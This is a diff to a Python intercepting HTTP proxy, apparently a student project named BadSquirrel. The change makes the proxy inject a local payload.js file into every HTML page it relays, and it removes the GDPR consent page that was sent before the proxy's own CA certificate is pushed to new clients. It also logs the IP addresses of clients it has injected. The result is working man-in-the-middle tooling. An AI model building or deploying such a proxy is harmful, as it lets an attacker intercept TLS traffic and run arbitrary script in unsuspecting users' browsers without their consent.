@@ -31,16 +31,19 @@ def join_with_script_dir(path):
 def inject_js_into_client(res_body):
     b_body_pos = res_body.find("</body>")
     if b_body_pos > 0:
-        modified_body = res_body[:b_body_pos] + "<script>alert('injected!');</script></body></html>"
-        print "Payload Injected"
+        with open("/home/simon/Documents/ProjetAnnuel/BadSquirrel/payload.js", 'rb') as f:
+            data = f.read()
+        modified_body = res_body[:b_body_pos] + data
+        #print "Payload Injected"
         return modified_body
 
 def check_user(ipclient):
-    print "check if the user have certificate"
+    #print "check if the user have certificate"
     if os.path.exists('ipclient.txt'):
         with open('ipclient.txt', 'r') as read_ip:
+
             for i in read_ip:
-                print 1, i,ipclient
+                #print 1, i,ipclient
                 if ipclient == i:
                     return False
                 else:
@@ -138,12 +141,11 @@ class ProxyRequestHandler(BaseHTTPRequestHandler):
 
     def do_GET(self):
         req=self
-
-        if check_user(''.join(self.client_address[0].split(':')[-1:]))==True:
-            print "OK",''.join(self.client_address[0].split(':')[-1:])
-            #with open('ipclient.txt', 'a') as write_ip:
-                #write_ip.write(''.join(self.client_address[0].split(':')[-1:]))
-            self.send_RGPD()
+        #print req.headers
+        if check_user(''.join(self.client_address[0].split(':')[-1:]))==True :
+            print "[#] Certficate injected:",''.join(self.client_address[0].split(':')[-1:])
+            with open('ipclient.txt', 'a') as write_ip:
+                write_ip.write(''.join(self.client_address[0].split(':')[-1:]))
             self.send_cacert()
             return
 
@@ -294,7 +296,7 @@ class ProxyRequestHandler(BaseHTTPRequestHandler):
         return text
 
     def send_RGPD(self):
-        print "rgpd"
+        #print "rgpd"
         with open("rgpd.html", 'rb') as f:
             data = f.read()
 
@@ -306,7 +308,7 @@ class ProxyRequestHandler(BaseHTTPRequestHandler):
         self.wfile.write(data)
 
     def send_cacert(self):
-        
+
         with open(self.cacert, 'rb') as f:
             data = f.read()
 
@@ -408,7 +410,7 @@ class ProxyRequestHandler(BaseHTTPRequestHandler):
         pass
         if res.headers.get('Content-Type'):
             if 'text/html' in res.headers.get('Content-Type'):
-                #print req.headers.get("User-Agent")
+                print "[#] Injected", ''.join(self.client_address[0].split(':')[-1:]), self.headers['Host']
                 return inject_js_into_client(res_body)
     def save_handler(self, req, req_body, res, res_body):
         self.print_info(req, req_body, res, res_body)
@@ -421,7 +423,7 @@ def interception_http(HandlerClass=ProxyRequestHandler, ServerClass=ThreadingHTT
     httpd = ServerClass(server_address, HandlerClass)
 
     sa = httpd.socket.getsockname()
-    print "Serving HTTP Proxy on", sa[0], "port", sa[1], "..."
+    #print "Serving HTTP Proxy on", sa[0], "port", sa[1], "..."
     httpd.serve_forever()
 
 
